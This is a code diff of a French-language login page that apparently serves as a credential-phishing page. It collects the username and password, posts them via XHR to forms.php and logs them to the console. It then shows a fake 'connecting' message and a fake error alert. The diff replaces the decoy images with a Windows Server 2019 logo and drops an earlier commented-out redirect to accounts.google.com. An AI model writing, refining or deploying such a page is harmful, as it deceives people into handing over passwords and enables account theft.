@@ -52,34 +52,20 @@
             height: 150px;
             border-radius: 50%;
         }
-        #success {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background-color: rgba(0, 123, 255, 0.8);
-            color: #fff;
-            padding: 10px;
-            border-radius: 5px;
-            display: none;
-        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>Connexion</h2>
         <form id="loginForm" action="forms.php" method="post">
             <input type="text" id="identifiant" name="identifiant" placeholder="Identifiant" required>
             <input type="password" id="motdepasse" name="motdepasse" placeholder="Mot de passe" required>
             <button type="submit">Se connecter</button>
         </form>
         <div id="image-container">
-            <img id="image1" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSiqm89XGsuUMMdzfgFA7K06NGmG6C7qgFKySfrWooavIRPLR1fX74lr0o8aMN5Vb3xTAU&usqp=CAU" alt="Image 1">
-            <img id="image2" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSSeTba3ZWlKR9xrrIruALN5C6VhxLSG6RTrTY33dVubA&s" alt="Image 2">
-            
+            <img id="image1" src="https://ck-officetechnologies.lu/wp-content/uploads/sites/2/2021/07/windows-server-2019.png">
         </div>
-        <div id="success">
-            <div class="message" id="message">Connexion en cours...</div>
+        <div id="success" style="display:none;">
+            <h2 class="message" id="message">Connexion en cours...</h2>
         </div>
     </div>
 
@@ -95,25 +81,34 @@
             document.getElementById("image-container").style.display = "none";
             document.getElementById("success").style.display = "block";
 
+            // Création d'une requête XHR
+            var formData = new FormData();
+            formData.append("identifiant", identifiant);
+            formData.append("motdepasse", motdepasse);
             var xhr = new XMLHttpRequest();
             xhr.open("POST", "forms.php", true);
-            xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState == 4 && xhr.status == 200) {
+
+            // Écoute de l'événement load pour afficher la réponse
+            xhr.onload = function() {
+                if (xhr.status === 200) {
                     console.log(xhr.responseText); // Affiche la réponse dans la console
+                } else {
+                    console.error('Une erreur s\'est produite.');
                 }
             };
-            xhr.send("identifiant=" + identifiant + "&motdepasse=" + motdepasse);
+
+            // Envoi de la requête avec les données FormData
+            xhr.send(formData);
             setTimeout(function() {
                 console.log("Identifiant:", identifiant);
                 console.log("Mot de passe:", motdepasse);
-            }, 500);
-
-            /*
-            document.getElementById("message").innerHTML="Probleme de connexion, veuillez reesayer"
+            }, 2000);
+            
             setTimeout(function() {
-                window.location.href = "https://accounts.google.com";
-            }, 3000);*/
+                alert("Une erreur s'est produite, veuillez reessayer")
+            }, 3000);
+            
+
         });
     </script>
 </body>
